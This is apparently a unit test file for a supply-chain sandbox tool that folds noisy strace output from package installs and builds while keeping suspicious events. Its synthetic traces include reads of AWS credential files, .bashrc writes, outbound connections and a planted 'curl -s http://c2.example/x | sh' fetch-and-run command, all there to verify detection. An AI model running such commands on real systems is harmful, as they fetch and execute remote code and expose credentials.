"""Unit tests for cr-trace-fold.py: python3 -m unittest sandbox/e2b/guest/test_trace_fold.py"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest

FOLD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cr-trace-fold.py")

TRACE = """100 1.0 execve("/usr/bin/env", ["env"], 0x1 /* 3 vars */) = 0
100 1.1 execve("/bin/bash", ["bash"], 0x1 /* 3 vars */) = 0
100 1.2 clone(child_stack=NULL, flags=SIGCHLD) = 101
101 1.3 execve("/usr/local/bin/pnpm", ["pnpm"], 0x1 /* 3 vars */) = 0
101 1.4 clone3({flags=CLONE_VM|CLONE_THREAD}, 88) = 102
102 1.5 openat(AT_FDCWD, "/home/cr/.local/share/pnpm/store/v10/files/aa/bb", O_WRONLY|O_CREAT, 0644) = 7
102 1.6 openat(AT_FDCWD, "/work/src/node_modules/.pnpm/x/index.js", O_WRONLY|O_CREAT, 0644) = 8
102 1.65 openat(AT_FDCWD, "/home/cr/.aws/credentials", O_RDONLY) = 9
103 1.7 openat(AT_FDCWD, "/work/src/early.js", O_RDONLY) = 3
101 1.8 vfork( <unfinished ...>
103 1.9 execve("/bin/sh", ["sh", "-c", "node install.js"], 0x1 /* 3 vars */) = 0
101 2.0 <... vfork resumed>) = 103
103 2.1 clone(child_stack=NULL, flags=SIGCHLD) = 104
104 2.2 execve("/usr/bin/node", ["node", "install.js"], 0x1 /* 3 vars */) = 0
104 2.3 openat(AT_FDCWD, "/work/src/node_modules/evil/payload", O_WRONLY|O_CREAT, 0644) = 3
101 2.4 connect(9, {sa_family=AF_INET, sin_port=htons(443)}, 16) = 0
"""


class FoldTests(unittest.TestCase):
    def test_folds_package_manager_files_and_keeps_scripts(self):
        with tempfile.TemporaryDirectory() as d:
            t, j = os.path.join(d, "trace.install"), os.path.join(d, "folded.json")
            with open(t, "w") as f:
                f.write(TRACE)
            subprocess.run([sys.executable, FOLD, t, "/home/cr", j], check=True, capture_output=True)
            out = open(t).read()
            info = json.load(open(j))
        self.assertEqual(info["folded"], 2)
        self.assertNotIn("pnpm/store", out)
        self.assertNotIn(".pnpm/x/index.js", out)
        self.assertIn("/home/cr/.aws/credentials", out, "a decoy read by the package manager stays")
        self.assertIn("/work/src/early.js", out, "a process seen before its clone returned is never folded")
        self.assertIn("evil/payload", out, "a script's writes stay")
        self.assertIn("connect(", out)
        self.assertIn('execve("/bin/sh"', out)

    def test_split_calls_fold_for_the_package_manager_only(self):
        trace = (
            '100 1.0 execve("/opt/cr/go/bin/go", ["go", "build"], 0x1 /* 3 vars */) = 0\n'
            '100 1.1 openat(AT_FDCWD, "/opt/cr/go/src/runtime/proc.go", O_RDONLY|O_CLOEXEC <unfinished ...>\n'
            '100 1.2 <... openat resumed>) = 7\n'
            '100 1.3 clone(child_stack=NULL, flags=SIGCHLD) = 101\n'
            '101 1.4 execve("/bin/sh", ["sh", "-c", "./gen.sh"], 0x1 /* 3 vars */) = 0\n'
            '101 1.5 openat(AT_FDCWD, "/usr/lib/secret", O_RDONLY <unfinished ...>\n'
            '101 1.6 <... openat resumed>) = 3\n'
        )
        with tempfile.TemporaryDirectory() as d:
            t, j = os.path.join(d, "trace.install"), os.path.join(d, "folded.json")
            with open(t, "w") as f:
                f.write(trace)
            subprocess.run([sys.executable, FOLD, t, "/home/cr", j], check=True, capture_output=True)
            with open(t) as f:
                out = f.read()
            with open(j) as f:
                info = json.load(f)
        self.assertEqual(info["folded"], 2, "both halves of the package manager's split call")
        self.assertNotIn("runtime/proc.go", out)
        self.assertIn("/usr/lib/secret", out, "a script's split call stays, both halves")
        self.assertEqual(out.count("openat resumed"), 1)

    def test_make_build_folds_its_noise_and_keeps_behaviour(self):
        trace = (
            '200 1.0 execve("/usr/bin/env", ["env"], 0x1 /* 3 vars */) = 0\n'
            '200 1.1 execve("/usr/bin/make", ["make", "-j4"], 0x1 /* 3 vars */) = 0\n'
            '200 1.2 clone(child_stack=NULL, flags=SIGCHLD <unfinished ...>\n'
            '201 1.3 execve("/bin/sh", ["sh", "-c", "cc -c a.c"], 0x1 /* 3 vars */) = 0\n'
            '200 1.35 <... clone resumed>) = 201\n'
            '201 1.4 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3\n'
            '201 1.5 openat(AT_FDCWD, "/usr/include/stdio.h", O_RDONLY) = 3\n'
            '201 1.6 openat(AT_FDCWD, "/work/src/src/a.o", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4\n'
            '201 1.7 openat(AT_FDCWD, "/home/cr/.aws/credentials", O_RDONLY) = 5\n'
            '201 1.8 openat(AT_FDCWD, "/home/cr/.bashrc", O_WRONLY|O_APPEND) = 6\n'
            '201 1.9 openat(AT_FDCWD, "/usr/lib/libx.so", O_WRONLY|O_CREAT, 0644) = 7\n'
            '201 2.0 connect(9, {sa_family=AF_INET, sin_port=htons(443)}, 16) = 0\n'
            '201 2.1 execve("/usr/bin/curl", ["curl", "http://x"], 0x1 /* 3 vars */) = 0\n'
        )
        with tempfile.TemporaryDirectory() as d:
            t, j = os.path.join(d, "trace.install"), os.path.join(d, "folded.json")
            with open(t, "w") as f:
                f.write(trace)
            subprocess.run([sys.executable, FOLD, t, "/home/cr", j], check=True, capture_output=True)
            with open(t) as f:
                out = f.read()
            with open(j) as f:
                info = json.load(f)
        self.assertEqual(info["folded"], 5, "the clone (both halves), the loader cache, a header read and an object write in the tree")
        for gone in ("ld.so.cache", "stdio.h", "a.o"):
            self.assertNotIn(gone, out)
        for kept in (".aws/credentials", ".bashrc", "/usr/lib/libx.so", "connect(", "/usr/bin/curl", '"sh", "-c"'):
            self.assertIn(kept, out)


    def _fold(self, trace):
        with tempfile.TemporaryDirectory() as d:
            t, j = os.path.join(d, "trace.install"), os.path.join(d, "folded.json")
            with open(t, "w") as f:
                f.write(trace)
            subprocess.run([sys.executable, FOLD, t, "/home/cr", j], check=True, capture_output=True)
            with open(t) as f:
                out = f.read()
            with open(j) as f:
                return out, json.load(f)

    def test_ten_thousand_cc_starts_fold_and_a_planted_curl_stays(self):
        lines = ['300 1.0 execve("/usr/bin/make", ["make"], 0x1 /* 3 vars */) = 0\n']
        for i in range(10000):
            lines.append('300 1.1 clone(child_stack=NULL, flags=SIGCHLD) = %d\n' % (1000 + i))
            lines.append('%d 1.2 execve("/usr/bin/cc", ["cc", "-c", "f%d.c"], 0x1 /* 3 vars */) = 0\n' % (1000 + i, i))
        lines.append('300 2.0 clone(child_stack=NULL, flags=SIGCHLD) = 99999\n')
        lines.append('99999 2.1 execve("/bin/sh", ["sh", "-c", "curl -s http://c2.example/x | sh"], 0x1 /* 3 vars */) = 0\n')
        lines.append('99999 2.2 execve("/usr/bin/curl", ["curl", "-s", "http://c2.example/x"], 0x1 /* 3 vars */) = 0\n')
        out, info = self._fold("".join(lines))
        self.assertEqual(out.count('execve("/usr/bin/cc"'), 20, "the first 20 cc starts are kept as a sample")
        self.assertEqual(info["counts"]["build start cc"], 9980)
        self.assertIn('"curl -s http://c2.example/x | sh"', out, "a recipe shell naming curl stays")
        self.assertIn('execve("/usr/bin/curl"', out, "curl started inside the build stays")

    def test_a_long_argv_is_cut_to_512_bytes_with_its_size(self):
        long_args = ", ".join('"-I/work/src/deps/include/%03d"' % i for i in range(80))
        trace = '400 1.0 execve("/usr/bin/python3", ["python3", %s], 0x1 /* 3 vars */) = 0\n' % long_args
        out, _ = self._fold(trace)
        self.assertIn("[argv cut: ", out)
        self.assertIn(", ...], 0x1 /* 3 vars */) = 0", out)
        self.assertLess(len(out), 700)


    def test_relative_paths_resolve_against_the_working_directory(self):
        trace = (
            '500 1.0 execve("/usr/bin/make", ["make"], 0x1 /* 3 vars */) = 0\n'
            '500 1.1 chdir("src") = 0\n'
            '500 1.2 openat(AT_FDCWD, "server.h", O_RDONLY) = 3\n'
            '500 1.3 openat(AT_FDCWD, "../deps/hiredis/sds.h", O_RDONLY) = 3\n'
            '500 1.4 chdir("/home/cr") = 0\n'
            '500 1.5 openat(AT_FDCWD, ".aws/credentials", O_RDONLY) = 3\n'
        )
        out, info = self._fold(trace)
        self.assertNotIn("server.h", out)
        self.assertNotIn("sds.h", out)
        self.assertIn(".aws/credentials", out, "a relative read that resolves to the home directory stays")


if __name__ == "__main__":
    unittest.main()
